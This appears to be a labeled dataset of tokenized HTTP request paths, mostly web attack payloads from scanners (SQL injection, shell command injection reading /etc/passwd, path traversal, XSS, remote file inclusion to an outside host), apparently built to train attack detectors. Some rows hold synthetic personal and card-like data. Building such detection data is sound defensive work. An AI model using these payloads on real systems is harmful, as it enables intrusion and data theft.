sentences 	 labels
/ string / strings / parameters = 1 '  where 1623 = 1623 ; select  ( case when  ( 4393 = 2875 )  then 1 else 4393 *  ( select 4393 from master .  . sysdatabases )  end )  --  \r\n\r\n 	 1
/ string / strings / parameters = $  { passthru ( print (  ` echo pyelub ; echo  $  (  ( 29 + 64 )  )  ; echo pyelub ; echo pyelub `  )  ;  # pyelub  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  and make_set ( 8403 = 8403 , 8899 )  and  ' lnwe '  =  ' lnwe  \r\n\r\n 	 1
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \ boot . ini  \r\n\r\n 	 1
/ string / str =  $  ( echo yqabcf )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 1
/ main . php ? logout =  "  | ping -w 11000 -n 1 1 . 2 . 3 . 4 | rem  \r\n\r\n 	 1
/ string / strings / parameters = < var onmouseover =  " prompt ( 1 )  "  > on mouse over <  / var >  ?  \r\n\r\n 	 1
/ string / id = 1 & nombre = queso + manchego & precio = 100 /  & cantidad = 15 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / index . php ? search =  < script > foo <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  in boolean mode )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  #  \r\n\r\n 	 1
/ string / modo = entrar & login = hedrich & pwd = chonta & remember =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = "  &  & echo eiucdv $  (  ( 83 + 99 )  )  $  ( echo eiucdv ) eiucdv "  \r\n\r\n 	 1
/  < script > document . cookie =  " testziyq = 5055 ;  "  <  / script >  \r\n\r\n 	 1
/ pbserver /  .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  \r\n\r\n 	 1
/ examples / jsp / cal / topic . php ? tid =  ' select  \r\n\r\n 	 1
/ phpmyadmin / index . php ? page =  / etc / passwd \ x00  \r\n\r\n 	 1
/ j2kdmfw4 . nsf ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / modo = registro & login = boudin & password = interpretacin & nombre = alcibades & apellidos = ferrandi + moja & email = leistiko @ soymadrileo . je & dni = 21274501f & direccion = travesia + travesia + 1 + isaac + peral ,  + s / n +  & ciudad = ivor *  * ra & cp = 09091 & provincia = segovia & ntc = 2482906400759424 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) gcrr )  #  \r\n\r\n 	 1
/ ydexw8by . php3 ?  < script > document . cookie =  " testulex = 4996 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5  \r\n\r\n 	 1
/ shop / index . php ? action = xxpathxx ?  & cmd = cat config . php  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo roezhe )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 1
/ ap58k3ci . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = |   [  1 -ne  $  ( echo pefrrd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ogqlys )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  "  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / strings / parameters = < script src =  " data :  \ xe0 \ xa4 \ x98 , javascript : alert ( 1 )  "  >  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = "  & echo xpabsl $  (  ( 91 + 48 )  )  $  ( echo xpabsl ) xpabsl  \r\n\r\n 	 1
/ string / strings / parameters = )  ;  } print (  ` echo scgphn echo  $  (  ( 41 + 99 )  )  echo scgphn echo scgphn `  )  ;  )  } scgphn  \r\n\r\n 	 1
/ scripts / index . php ? search =  < script > foo <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  \r\n\r\n 	 1
/ cgi-bin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 419495929 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 1
/ themes / container . php ? theme_directory = xxpathxx \r\n\r\n 	 1
/ wordpress_files / all_users / wp-content / plugins / enigma2 . php ? boarddir = xxpathxx ?  \r\n\r\n 	 1
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo ygaawq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  \r\n\r\n 	 1
/ egaet53a . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = '   str =  $  ( echo karbcx )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  \r\n\r\n 	 1
/ string / strings / parameters = or 1  --  '  \r\n\r\n 	 1
/ top . php ? stuff =  " ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  \r\n\r\n 	 1
/ scripts / admin / plog-admin-functions . php ? config [ basedir ]  =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  )  and  ( 3502 = 7893 )  * 7893 and  (  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ antispam / listdel ? file = blacklist & name = b < script > alert (  ' vulnerable '  )  <  / script >  & startline = 0  \r\n\r\n 	 1
/ qb2xy9aw . php ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / modo = registro & login = ploof & password = p04u803 & nombre = alenda & apellidos = pruneda + de + velasco & email = caron @ nexuspark . ai & dni = 85853074bp & direccion = carretera + lebrija ,  + 25 +  & ciudad = santo + tom + del + puerto & cp = 42126 & provincia = cceres & ntc = 7582936564650481 & b1 = registrar  \r\n\r\n 	 1
/ help . php ? q = ver \ x09 > q41751651 & rem \ x09  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / www / delivery / ac . php ? bannerid = -1331904368 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_2tgmms8c ]  )  )  ; die ;  /  *  \r\n\r\n 	 1
/ javascript / pubs . exe  \r\n\r\n 	 1
/ main . php ? logout =  '  ; uname \ x09 > q35732238 \ x09 #  \r\n\r\n 	 1
/ admin / admin_news_bot . php ? root_path = xxpathxx ?  \r\n\r\n 	 1
/ string / strings / parameters = |  | echo $ ifsiwafla $  (  ( 17 + 83 )  )  $  ( echo $ ifsiwafla ) iwafla /  /  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini  \r\n\r\n 	 1
/ string / strings / parameters = '  ;  str =  $  ( echo qukucg )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 1
/  < meta http-equiv = set-cookie content =  " testftxz = 5980 "  >  \r\n\r\n 	 1
/ examples / jsp / error / ncbook / ncbook . cgi ? action = default & current =  | cat  / etc / passwd |  & form_tid = 996604045 & prev = main . html & list_message_index = 10  \r\n\r\n 	 1
/ cgi-bin / emumail / emumail . cgi ? type =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ examples / jsp / error / index . php ? act = arcade & do = stats & gameid = 1 '  \r\n\r\n 	 1
/ help . php ? q =  "  & ver ;  > q11575615 & rem ;  \r\n\r\n 	 1
/ main . php ? stuff =  & ver ,  > q61913742 & rem ,  \r\n\r\n 	 1
/ ht8pn8uq . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ xlj7h65o . idc ?  < script > document . cookie =  " testtbbe = 856 ;  "  <  / script >  \r\n\r\n 	 1
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908785 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  \r\n\r\n 	 1
/ string / modo = registro & login = kacy & password = en4ocar & nombre = policarpo & apellidosa = stucchi & email = weismuller @ e-b-s . kr & dni = 77550396p & direccion = avinguda + biscaia ,  + 98 + 13-g & ciudad = villares + del + saz & cp = 05514 & provincia = segovia & ntc = 9931554844705461 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = |   [  4 -ne  $  ( echo vazljc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  \r\n\r\n 	 1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hvspqm )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  |  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  waitfor delay  ' 0 : 0 : 5 '  and  (  (  (  ' clcf '  =  ' clcf  \r\n\r\n 	 1
/ string / strings / parameters = "  ;  str =  $  ( echo upzcij )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  \r\n\r\n 	 1
/ string / strings / parameters = echo qfcalq $  (  ( 19 + 0 )  )  $  ( echo qfcalq ) qfcalq '  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  )  ; waitfor delay  ' 0 : 0 : 5 '  --  \r\n\r\n 	 1
/ ny1b3qq4 . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / index . php ? include_files [  ]  =  & include_files [ query_string ]  =  / etc / passwd  \r\n\r\n 	 1
/ scs86g1p . cfc ?  < script > document . cookie =  " testquyx = 2820 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = "  & echo jkzwso $  (  ( 16 + 99 )  )  $  ( echo jkzwso ) jkzwso |  \r\n\r\n 	 1
/ en-us / i686v90l . dll ?  < meta http-equiv = set-cookie content =  " testfutf = 1550 "  >  \r\n\r\n 	 1
/ string / strings / parameters = | echo dpzhut $  (  ( 28 + 81 )  )  $  ( echo dpzhut ) dpzhut |  \r\n\r\n 	 1
/ main . php ? stuff =  '  & rm \ x09q84519525 \ x09 #  \r\n\r\n 	 1
/ string / strings / parameters = "   str =  $  ( echo vycnrp )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  \r\n\r\n 	 1
/ en-us / account / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1647791366 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 1
/ string / strings / parameters = ) print (  ` echo ggcmzv `  .  ` echo  $  (  ( 6 + 53 )  )  `  .  ` echo ggcmzv `  .  ` echo ggcmzv `  )  )  } ggcmzv  \r\n\r\n 	 1
/ scripts / themes / program / themesettings . inc . php ? themesdir =  / etc / passwd \ x00  \r\n\r\n 	 1
/ cgi-bin / index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1331905123 '  , null , null , null , null  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  where 9242 = 9242 ; begin dbms_lock . sleep ( 5 )  ;  end --  \r\n\r\n 	 1
/ ywaxntrx . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / modo = registro & login = perceval & passworda = tin86 & nombre = parmenio & apellidos = d ' molino + bocas & email = jay @ almascanarias . wf & dni = 96398598d & direccion = lepant + 33 ,  +  & ciudad = benuza & cp = 26560 & provincia = guadalajara & ntc = 2171179152751946 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = < img \ x10src = x onerror =  " javascript : alert ( 1 )  "  >  \r\n\r\n 	 1
/ cgi-sys / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / modo = registro & login = gallard & password = c36ba & nombre = federica & apellidos = romaguera + po , c * h & email = pankin @ muevetuweb . mobi & dni = 49680817n & direccion = calle + zapateria + vieja + 71 + 8d & ciudad = romanillos + de + atienza & cp = 03579 & provincia = tarragona & ntc = 2469234767327968 & b1 = registrar  \r\n\r\n 	 1
/ help . php ? q =  '  \ x0adel \ x09q87897781 \ x09 #  \r\n\r\n 	 1
/  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  .  .  \  .  .  \  \  \  { file }  \r\n\r\n 	 1
/ 169okeyj . mscgi ?  < script > document . cookie =  " testxeoi = 3573 ;  "  <  / script >  \r\n\r\n 	 1
/ s7qus4g3 . pl ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = <  !  --  < img src =  "  --  >  < img src = x onerror = alert ( 123 )  /  /  "  >  \r\n\r\n 	 1
/ j2kdmfw4 . jsp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ examples / jsp / cal / nucleus / libs / pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00  \r\n\r\n 	 1
/ manager / index . php ? module =  < script > foo <  / script >  \r\n\r\n 	 1
/ examples / jsp / cal / whois . cgi ? action = load & whois =  ; id  \r\n\r\n 	 1
/ top . php ? stuff =  " ver & rem ,  \r\n\r\n 	 1
/ string / modo = insertar & precio = 8792 & b1 = pasar + por + cajaany set-cookie :  + tamper = 1041264011025374727  \r\n\r\n 	 1
/ string / strings / parameters = -7610 '  or 3038 = 3038  \r\n\r\n 	 1
/ includes / adodb / back / adodb-postgres7 . inc . php ? adodb_dir = xxpathxx ?  \r\n\r\n 	 1
/ string / modo = entrar & login = jeavons6 & pwd = empapuciar & remember = off & b1 = entrar '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  \r\n\r\n 	 1
/ string / strings / parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null )   /  *  \r\n\r\n 	 1
/ string / id = 2 & nombre = vino + rioja & precio =  < script > alert (  " paros "  )  ;  <  / script >  & cantidad = 26 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ bcwb_path / system / default . css . php ? root_path_admin = xxpathxx  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / docs / index . php ? lang =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ scripts / starnet / addons / slideshow_full . php ? album_name =  ' 1283310915  \r\n\r\n 	 1
/ help . php ? q =  '  \ x0auname \ x09 > q61575727 \ x09 #  \r\n\r\n 	 1
/  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  { file }  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual and  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ sablonlar / gunaysoft / gunaysoft . php ? icerikyolu = xxpathxx  \r\n\r\n 	 1
/ string / strings / parameters = '  & echo synxtk $  (  ( 0 + 99 )  )  $  ( echo synxtk ) synxtk |  \r\n\r\n 	 1
/ manager / phf ? qalias = x \ x0a / bin / cat  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  and  ( 7424 = 2381 )  * 2381 and  "  " dvju "  "  =  "  " dvju  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  as wfne where 8933 = 8933 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  --  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo ojgbkf )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  \r\n\r\n 	 1
/ t3af3tdz . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ opensiteadmin / scripts / classes / databasemanager . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / frznctvhi0i5 ?  \ x00  \r\n\r\n 	 1
/ string / strings / parameters = '  |   [  7 -ne  $  ( echo pspape  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo knetda )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  \r\n\r\n 	 1
/ string / strings / parameters = -8655 )  where 3910 = 3910 union all select 3910 , 3910 #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  where 5035 = 5035 and 8594 =  ( select 8594 from pg_sleep ( 5 )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ javascript / poll . exe  \r\n\r\n 	 1
/ string / strings / parameters = -1162 "  "  )  )  as mhmh where 8710 = 8710 or make_set ( 4822 = 7598 , 7598 )  --  \r\n\r\n 	 1
/ main . php ? logout =  "  \ x0arm \ x09q98198938 \ x09 #  \r\n\r\n 	 1
/ main . php ? stuff =  "  & del \ x09q54676593 \ x09 #  \r\n\r\n 	 1
/ string / strings / parameters = -6097 %  '  )  )  union all select 3990 , 3990 , 3990 , 3990 , 3990 , 3990 --  \r\n\r\n 	 1
/ examples / jsp / error / misc / audio . php ? recording =  .  .  / version . inc  \r\n\r\n 	 1
/ includes / functions . php ? phpbb_root_path = xxpathxx  \r\n\r\n 	 1
/ string / strings / parameters = < img src =  " jav	ascript : confirm ( document . location )  ;  "  >  \r\n\r\n 	 1
/ xfkun1ku . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = '  & echo $ ifsdvjeek $  (  ( 20 + 0 )  )  $  ( echo $ ifsdvjeek ) dvjeek  \r\n\r\n 	 1
/ string / strings / parameters = echo wgoisg $  (  ( 75 + 94 )  )  $  ( echo wgoisg ) wgoisg \  \r\n\r\n 	 1
/ help . php ? q =  "  & del \ x0cq17127645 & rem \ x0c  \r\n\r\n 	 1
/ string / modo = insertar & precio = 41 & b1 = confirmar /  \r\n\r\n 	 1
/ examples / jsp / error / apa_phpinclude . inc . php ? apa_module_basedir =  / etc / passwd \ x00  \r\n\r\n 	 1
/ 7dbjwpw6 . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ en-us / account / athenareg . php ? pass =   ; id  \r\n\r\n 	 1
/ main . php ? stuff =  "  \ x0auname \ x09 > q72429699 \ x09 #  \r\n\r\n 	 1
/ string / strings / parameters = '  |  | echo $ ifsoqcuyn $  (  ( 22 + 3 )  )  $  ( echo $ ifsoqcuyn ) oqcuyn /  /  \r\n\r\n 	 1
/ string / strings / parameters = < img src =  "  " blah "  " onmouseover =  "  " document . cookie = true ;  "  "  >  \r\n\r\n 	 1
/ javascript / hire . exe  \r\n\r\n 	 1
/ help . php ? q =  " ping \ x0c-w \ x0c11000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 & rem \ x0c  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo otxvur )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 1
/ string / strings / parameters = -2504 '  )  )  )  or 8723 = 9715  \r\n\r\n 	 1
/ phpmyadmin / top . php ? header =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo bkaifj )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  \r\n\r\n 	 1
/ examples / jsp / cal / common / visiteurs / include / menus . inc . php ? lvc_include_dir =  / etc / passwd \ x00  \r\n\r\n 	 1
/ scripts / starnet / addons / slideshow_full . php ? album_name =  ' 836532164  \r\n\r\n 	 1
/ piranha / secure / passwd . php3  \r\n\r\n 	 1
/ i7prbs22 . pl ?  < meta http-equiv = set-cookie content =  " testjnre = 7328 "  >  \r\n\r\n 	 1
/ plugins / backup / archive / predicate . php ? bkpwp_plugin_path = xxpathxx ?  \r\n\r\n 	 1
/ string / strings / parameters = "   str =  $  ( echo rowalz )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  \r\n\r\n 	 1
/ en-us / account / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ examples / jsp / num / lib / dbman_filter . inc . php ? lib_path =  / etc / passwd \ x00  \r\n\r\n 	 1
/ cgi-bin / shopplus . cgi ? dn = domainnikto . com & cartid =  \ xcartid %  & file =  ; cat  / etc / passwd |  \r\n\r\n 	 1
/ examples / jsp / jsp2 / jspx / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f  \r\n\r\n 	 1
